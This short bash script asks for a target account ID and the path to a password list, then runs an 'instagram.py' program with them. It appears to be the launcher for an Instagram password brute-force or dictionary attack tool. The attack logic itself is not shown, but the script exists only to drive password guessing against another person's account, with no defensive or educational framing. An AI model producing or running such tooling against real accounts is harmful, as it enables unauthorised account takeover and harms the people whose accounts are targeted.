#!/bin/bash

echo -n "TARGET ID: "

read t

echo -n "NAME OR PATH OF PASSWD LIST: "

read p

echo "starting........."

python3 instagram.py $t $p -m 3

